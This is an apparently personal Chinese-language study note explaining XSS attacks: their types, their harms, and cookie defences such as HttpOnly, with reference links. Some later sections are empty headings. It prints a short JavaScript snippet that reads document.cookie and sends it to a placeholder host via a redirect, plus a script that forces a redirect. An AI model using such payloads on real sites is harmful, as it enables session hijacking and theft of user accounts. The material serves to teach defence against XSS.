---
title: XSS攻击原理及防范
---
[web安全之 XSS攻击与防御](https://www.bilibili.com/video/av56520828?from=search&seid=10110424041084593238)
## 基本概念
XSS即跨站脚本攻击(Cross Site Scripting)，为不和CSS(层叠样式表-Cascading Style Sheets)的缩写混淆，将跨站脚本攻击缩写为XSS。

XSS的原理是：**恶意攻击者在页面中插入恶意的`script`代码，当用户浏览该页面时，嵌入页面中的`script`代码就会被执行，从而达到恶意攻击用户的目的**。
::: tip
XSS的重点不在于跨站攻击而**在于脚本攻击**。攻击者可以利用web应用的漏洞或缺陷之处，向页面注入恶意的程序或代码，以达到攻击的目的。
:::
通俗来讲就是：我们的页面在加载并且渲染绘制的过程中，如果加载并执行了意料之外的程序或代码（脚本、样式），就可以认为是受到了XSS攻击。
XSS攻击最主要有如下分类：反射型、存储型、及DOM-based型。反射型和DOM-baseed型可以归类为非持久性XSS攻击。存储型可以归类为持久性XSS攻击。
## XSS的危害
* 通过`document.cookie`盗取`cookie`中的信息；
* 使用`js或css`破坏页面正常的结构与样式；
* 流量劫持（通过访问某段具有`window.location.href`定位到其他页面）；
* **dos攻击**：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。并且通过携带过程的 cookie信息可以使服务端返回400开头的状态码，从而拒绝合理的请求服务。
* 利用`iframe、frame、XMLHttpRequest或上述Flash`等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作，并且攻击者还可以利用`iframe`，`frame`进一步的进行`CSRF`攻击。
* 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。

XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其他用户使用的页面中，从而对用户进行攻击。

XSS常见攻击：
1. 盗取用户账号(窃取网页浏览中的cookie值)；
2. 非法转账；
3. 篡改系统信息；
4. 网站挂马

## 窃取网页浏览中的cookie值
如何用XSS攻击盗取用户账号？

在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。
如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到document.cookie。
试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过某些厂商的cookie有其他验证措施如：Http-Only保证同一cookie不能被滥用）
```js
var cookie = document.cookie; // 获取浏览器的cookie值
window.location.herf = 'http://127.0.0.1/index.php?cookie=' + cookie;
```
### cookie安全策略
在服务器端设置cookie的时候设置 http-only, 这样就可以防止用户通过JS获取cookie。对cookie的读写或发送一般有如下字段进行设置：
* http-only: 使得在客户端无法通过js脚本来操作cookie(document.cookie会显示http-only的cookie项被自动过滤掉)，只允许http或https请求读取cookie，防止用户账号被盗。发送请求时自动发送cookie。
* secure-only: 只允许https请求读取，发送请求时自动发送cookie。
* host-only: 只允许主机域名与domain设置完成一致的网站才能访问该cookie。

## 劫持流量实现恶意跳转
这个很简单，就是在网页中想办法插入一句像这样的语句：
```html
<script>
    window.location.href="http://www.baidu.com";
</script>
```
那么所访问的网站就会被跳转到百度的首页。
早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。
## XSS非法转账

## 反射型XSS

## 利用与绕过

## 参考文档
1. [前端安全系列（一）：如何防止XSS攻击？](https://tech.meituan.com/2018/09/27/fe-security.html)
2. [根据白名单过滤HTML(防止 XSS 攻击)](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)
3. [XSS攻击原理分析与防御技术](https://segmentfault.com/a/1190000013315450)
4. [浅谈XSS攻击的那些事（附常用绕过姿势）](https://zhuanlan.zhihu.com/p/26177815)
5. [与《Yii框架》不得不说的故事—安全篇](https://www.imooc.com/learn/467)
6. [Web安全-XSS](https://www.imooc.com/learn/812)
7. [WEB安全 - 认识与防御XSS攻击](https://www.cnblogs.com/HCJJ/p/9468871.html)
8. [web安全之XSS攻击原理及防范](https://www.cnblogs.com/tugenhua0707/p/10909284.html)
9. [Yii框架不得不说的故事—安全篇（3）](https://www.imooc.com/learn/467)
10. [Web安全-XSS](https://www.imooc.com/learn/812)
11. [浅说 XSS 和 CSRF](https://github.com/dwqs/blog/issues/68)